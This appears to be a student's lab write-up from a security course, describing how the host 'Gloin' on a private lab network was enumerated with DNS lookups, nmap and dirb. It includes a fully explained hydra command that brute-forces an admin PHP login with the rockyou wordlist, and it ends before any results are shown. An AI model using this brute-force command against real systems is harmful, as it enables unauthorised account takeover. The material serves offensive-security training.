# Exploiting Gloin

## Target IP Address
I was able to use my [dns-resolver.sh](https://github.com/JackLeonard802/SEC-335/blob/main/Tech%20Journal/Source%20Code/dns-resolver.sh) script against the target network to enumerate the dns records for all of the hosts, including Gloin.
> note: The IP addresses are given in the reverse format

## Open Ports

I was able to use nmap with the -sV flags on the host to scan ports 1-1000 and get the services running on those ports

## Discovered Vulnerability

By using DirBuster (dirb) I was able to enumerate the apache site and find a number of directories titled by a number of variations of "admin"
* `dirb https://10.0.5.31/entrance_exam/ -l`

Notably, there are a couple of paths with .php extensions (admin/index/login) that I could explore

After a little bit of poking around on the internet, I was able to craft a command using hydra to try to brute force the password for the user "admin"
* `sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.5.31 https-post-form "/entrance_exam/admin/login.php:username=admin&password=^PASS^:Invalid username or password."`
* `https-post-form` to specify form type
* `:username=admin&password=^PASS^` specifies the format of the request, and `^PASS^` defines where to insert the guessed password
* `:Invalid username or password.` specifies the verbiage given at an incorrect request

> These were the results of my brute force
